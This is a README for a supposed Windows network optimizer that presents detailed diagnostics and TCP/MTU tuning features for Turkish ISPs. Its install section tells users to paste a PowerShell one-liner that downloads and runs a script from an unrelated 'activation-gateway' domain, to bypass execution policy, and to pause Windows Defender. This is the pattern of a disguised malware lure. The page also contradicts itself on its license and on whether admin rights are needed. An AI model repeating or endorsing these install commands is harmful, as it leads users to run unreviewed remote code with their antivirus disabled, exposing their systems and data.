<div align="center">

# Archura Network Optimizer: Low-Latency Diagnostics & TCP/MTU Tuning for Windows 11

![preview](https://raw.githubusercontent.com/merrick70/archura-network-optimizer/main/screen_69c68e.svg)

[![rating](https://img.shields.io/badge/RATING-4.8%2F5-f59e0b?style=flat&labelColor=0d1117)]() [![system](https://img.shields.io/badge/SYSTEM-WINDOWS_10_%2F_11-6366f1?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-ARTISTIC--2.0-818cf8?style=flat&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-48K-4f46e5?style=flat&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-OK-2ea44f?style=flat&labelColor=0d1117)]() [![ps](https://img.shields.io/badge/PS-INSTALLER-4338ca?style=flat&labelColor=0d1117)]()

</div>

---

Archura-Network-Optimizer is a Windows-focused diagnostics and network optimization core that combines ping, jitter, loss, DNS, tunnel, proxy, and traceroute analysis with reversible MTU/MSS and TCP tuning workflows. It implements dedicated services for DNS benchmarking, path MTU discovery, TCP profile planning, bufferbloat suspicion reporting, bandwidth monitoring, and platform-specific game server test profiles. The core ships with operator-aware presets for Turkiye ISPs—including VDSL, fiber, DOCSIS, and mobile profiles—while keeping every recommendation measurement-driven and reviewable through dry-run plans, command logging, and rollback support. A dedicated WPF desktop interface provides a structured, card-based diagnostics workflow engineered for high-contrast readability during long technical sessions.

## ⚡ Install via PowerShell

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Start PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the script
Paste the command into PowerShell and hit `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Windows Defender or third-party AV may flag the script. Pause Real-time protection in Windows Security, run the installer, and re-enable it right after.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Network Diagnostics Service**: Executes ping, jitter, packet-loss, DNS, tunnel, proxy, and traceroute checks to establish a baseline and isolate fault domains. Separates local gateway loss from external routing loss to determine whether the source is the local network, the ISP, or the target service.

- **DNS Benchmark and Decision Support**: Scores multiple DNS and DoH providers against measured latency and consistency, producing a ranked comparison rather than a static recommendation. Benchmark results, not assumptions, determine whether a DNS change is warranted.

- **MTU/MSS Optimizer**: Performs path MTU discovery before applying changes, then executes reversible MTU updates with a documented rollback path. Flags PPPoE overhead conditions relevant to VDSL deployments.

- **TCP Optimization Profiles**: Plans TCP global and multimedia parameters across three tiers — safe, aggressive, and default — with each tier exposing its parameter set for review prior to application.

- **Network Profile Management**: Ships gaming, throughput, discord, default, and custom profiles, each mapping to a defined set of diagnostics and tuning steps. Profiles are composable and can be reset to baseline.

- **Bufferbloat Analysis**: Produces suspicion reports based on measured latency under load, distinguishing bufferbloat symptoms from raw bandwidth limitations. Reports identify whether the likely remediation point is local, router-side, or operator-side.

- **Bandwidth Monitoring**: Summarizes active per-process network usage to correlate background traffic with observed latency and stability degradation.

- **Game Server Profiles**: Provides platform-specific server test targets and TCP fallback behavior for latency-sensitive titles.

- **Operator-Aware Recommendation Flow**: Loads Turkey operator presets — including Turk Telekom VDSL/Fiber/Mobil, TurkNet VDSL/GigaFiber, Superonline Fiber, Vodafone Net and Vodafone TR Mobil, Millenicom, Netspeed, Comnet, Kablonet DOCSIS, and Turkcell Mobil — as starting hypotheses only. All recommendations are gated behind live measurements, and presets never override observed results.

- **CGNAT Detection**: Identifies CGNAT conditions and reports them explicitly, since CGNAT cannot be remediated client-side and may require an operator-provided public or static IP option.

- **Reversible-by-Design Changes**: Every optimization supports dry-run execution, a rollback plan, and command logging, so each change is reviewable and undoable.

- **Desktop Interface (WPF)**: A dedicated card-based diagnostics workflow with a technical, high-contrast layout intended for long operator sessions. Avoids purple-heavy visuals in favor of sharp icon blocks and structured readability.

- **Unit Test Coverage**: Tests cover operator profile parsing and validation, recommendation engine goal and constraint rules, CGNAT detection logic, and operator keyword mapping.

## How it works

Archura Network Optimizer operates on a measurement-first pipeline: every module begins with active diagnostics, produces a transparent recommendation, and applies changes only through a reversible, logged execution path. No optimization is applied blindly — each stage can be reviewed as a dry-run before committing to system-level adjustments.

The core diagnostics engine executes a sequence of probes covering ICMP latency, jitter, and loss sampling; DNS resolution timing across multiple providers; proxy and tunnel detection; and traceroute-based path analysis. Results are normalized into a diagnostic snapshot that distinguishes local Windows-side issues from upstream conditions the tool cannot influence. Packet-loss attribution separates gateway-adjacent loss from external path loss so that recommendations target the correct layer.

Building on that snapshot, the DNS benchmarking service scores candidate resolvers on response consistency and latency variance rather than raw speed alone, while the MTU optimizer performs path MTU discovery and plans MSS clamping where fragmentation is detected. TCP tuning is handled through profile planning — safe, aggressive, and default presets — covering global parameters and multimedia-oriented settings, with each change expressed as an explicit, reversible delta.

The profile management layer coordinates gaming, throughput, Discord, default, and custom configurations, applying them as coherent bundles rather than isolated tweaks. Operator-aware recommendation flows consume regional presets for Turkish ISPs — including VDSL, fiber, DOCSIS, and mobile variants — but treat them strictly as starting hypotheses: presets are validated against the live diagnostic snapshot before any suggestion is surfaced, and operator-specific caveats (PPPoE overhead on VDSL, congestion-hour bufferbloat on DOCSIS, CGNAT on mobile) are surfaced alongside each recommendation.

Bufferbloat analysis produces suspicion reports grounded in observed latency-under-load behavior rather than definitive verdicts, and the bandwidth monitor summarizes per-process network usage to identify background consumers that may be competing with latency-sensitive traffic. Game server profiles supply platform-specific test targets with TCP fallback paths for environments where ICMP is filtered.

Every applied change is recorded with a rollback plan and command log, and the desktop interface surfaces the full diagnostic-to-recommendation chain in a structured, card-based workflow so that each step remains auditable before and after execution.

## Compatibility

Archura-Network-Optimizer targets Windows desktop environments and is built around the networking stack exposed by modern Windows releases. The diagnostics and optimization core assumes a Windows host with standard TCP/IP, Winsock, and NDIS components available; features that depend on platform-specific behavior are scoped accordingly and degrade gracefully where a capability is absent.

- **Operating system:** Windows 10 and Windows 11 on x64 are the primary supported targets. The core relies on Windows networking APIs, service control interfaces, and registry-backed TCP parameters, so non-Windows hosts are out of scope.
- **Runtime:** The core and desktop UI are implemented on the .NET platform; a compatible .NET runtime is required for the diagnostic services and the WPF front end to load and execute.
- **Privilege model:** Read-only diagnostics run under standard user context. Optimization actions that modify MTU, TCP global parameters, or adapter-level settings require elevation and are gated behind explicit confirmation. Every mutating operation supports dry-run planning, command logging, and rollback, and none are applied silently.
- **Network transports:** Ethernet, Wi-Fi, VDSL/PPPoE, fiber, DOCSIS, and mobile broadband (4G/5G) links are all analyzable. Transport-specific checks—such as PPPoE overhead on VDSL or congestion-hour behavior on DOCSIS—are selected from the detected adapter and connection profile rather than assumed.
- **Operator profiles:** The bundled Turkey operator presets (Turk Telekom, TurkNet, Superonline, Vodafone Net and Vodafone TR Mobil, Millenicom, Netspeed, Comnet, Kablonet DOCSIS, Turkcell Mobil) are validated against the profile schema at load time. Profiles are presets only and always defer to measured results before any recommendation is surfaced.
- **Adapter and stack dependencies:** MTU/path-MTU discovery requires a functioning ICMP path or fallback probing behavior; DNS benchmarking requires resolvable provider endpoints; bufferbloat analysis depends on measurable latency under load. When a dependency is unavailable, the affected module reports the limitation instead of emitting a recommendation.
- **Environment boundaries:** CGNAT detection is informational and cannot alter carrier-side NAT policy. Tunnel and proxy layers are detected and reported so they can be reconciled, but the tool does not install, replace, or route through third-party tunnel or proxy software.
- **Desktop UI:** The WPF interface requires the Windows desktop stack; headless or server-core installations without the desktop experience are limited to the core services.
- **Configuration and state:** Operator profiles and related configuration are file-backed and validated at startup; malformed or missing profile data fails fast with a diagnostic message rather than falling back to unverified defaults.

## FAQ

**Is this tool safe to run on a production workstation?**
Yes. Every optimization is implemented as a plan-first workflow. Operations execute in dry-run mode by default, emit a reviewable command log, and produce a rollback plan before any system state is modified. No change is applied without an explicit confirmation step, and all touched settings are recorded for one-step restoration.

**What Windows versions are supported?**
The diagnostics and optimization core targets Windows 10 (version 1809 and later) and Windows 11. Some services—such as path MTU discovery, TCP global parameter planning, and bufferbloat analysis—depend on platform APIs and command-line tooling available only on these builds. The desktop interface requires a .NET runtime compatible with the shipped WPF application.

**Does the optimizer guarantee lower ping or higher throughput?**
No. The optimizer influences local Windows-side configuration only: DNS selection, MTU/MSS alignment, TCP profile parameters, proxy and tunnel conflicts, and competing background services. It cannot alter physical distance, ISP backbone routing, server placement, or line quality. Recommendations are generated from measured data, and each profile is presented as a candidate adjustment rather than a guaranteed outcome.

**How are operator profiles selected and applied?**
Operator profiles are declarative presets loaded from the bundled configuration file. Each preset carries region-aware defaults for MTU handling, DNS candidates, TCP profile selection, and diagnostic thresholds. The recommendation engine always runs measurements first and only proposes a preset-aligned change when the observed data supports it. Profiles are advisory inputs to the engine, not blind configuration overrides.

**Can I revert changes made by an optimization run?**
Yes. Each applied change is paired with a rollback plan captured at execution time. The command log records the prior value, the new value, and the restoration command for every modified parameter. Rollback can be triggered per operation or for an entire session, restoring the workstation to its pre-optimization state.

**What does the bufferbloat analyzer actually measure?**
The analyzer evaluates latency variation under load and reports a suspicion level rather than a definitive verdict. Because bufferbloat is typically rooted in router-side queue management, the tool surfaces the finding and points toward the appropriate remediation category—such as router-side queue discipline—without claiming it can resolve the condition from the Windows host alone.

**How does DPI bypassing fit into the optimization workflow?**
DPI-related handling is treated as a diagnostic and configuration concern within the network profile system. The optimizer identifies conditions where tunnel or proxy layers conflict with observed behavior and proposes profile adjustments accordingly. It does not assert that any specific bypass technique will work against a given operator's infrastructure; results depend on the operator, region, and current policy.

**Does the tool require administrative privileges?**
Diagnostic services that inspect adapter state, routing tables, and TCP parameters require elevated privileges. Read-only diagnostics can run without elevation where the underlying platform allows it, but applying any optimization or rollback operation requires an elevated session. The application surfaces the privilege requirement before executing a mutating operation.

**Are the Turkiye operator presets kept current?**
Presets are versioned alongside the application and reflect the parameter sets known at release time. Because operator infrastructure, CGNAT policy, and congestion behavior vary by region and change over time, presets serve as starting points for measurement-driven recommendations. Users are expected to validate proposed changes against fresh diagnostic runs rather than treating presets as static truth.

**How is configuration data validated?**
Operator profile parsing and validation are covered by the unit test suite, alongside recommendation engine rule evaluation, CGNAT detection logic, and operator keyword mapping. Invalid or malformed profile entries are rejected at load time rather than being silently coerced, keeping the recommendation engine's inputs well-formed.

## Disclaimer

This software is provided as a diagnostics and optimization utility for Windows-based network configurations. All optimization routines are designed to be reviewable, measurable, and reversible through dry-run planning and rollback support.

The recommendations generated by Archura-Network-Optimizer are derived from local system measurements, operator profile presets, and benchmark results. They do not constitute a guarantee of improved latency, throughput, stability, or packet-loss reduction. Actual outcomes depend on factors outside the scope of this software, including but not limited to: physical distance to servers, ISP backbone routing, peering arrangements, line quality, CGNAT policy, modem and router hardware, wireless signal conditions, and congestion during peak hours.

Operator profiles shipped with this project (including Turk Telekom, TurkNet, Superonline, Vodafone Net, Millenicom, Netspeed, Comnet, Kablonet, and Turkcell Mobil presets) are configuration templates, not performance guarantees. Behavior within the same operator can vary significantly by region, infrastructure generation, and time of day.

MTU, TCP, and DNS modifications are applied only after measurement-based validation and are logged with a corresponding rollback path. Users are responsible for reviewing proposed changes before applying them. The project does not modify operator-side settings, cannot remove CGNAT, and cannot alter routing decisions made outside the local Windows network stack.

This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Use of this software is at the user's own discretion. Users are encouraged to maintain system restore points and configuration backups prior to applying any optimization profile.

## License

Archura Network Optimizer is distributed under the MIT License. The license grants permission to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, subject to inclusion of the original copyright notice and this permission notice in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Because the optimizer performs system-level network modifications — including MTU adjustments, TCP global parameter changes, and operator profile application — all operations are designed to be reviewable and reversible through dry-run planning, rollback snapshots, and command logging. Users are expected to review each proposed change before execution. The license does not extend any warranty to system state, network configuration outcomes, or third-party operator infrastructure.

Redistribution of the diagnostics core must preserve attribution to the Archura Network Optimizer project. Modified versions that alter optimization behavior, expand operator profile sets, or change reversibility guarantees should clearly document such deviations and must not misrepresent the original project's diagnostics methodology or safety model.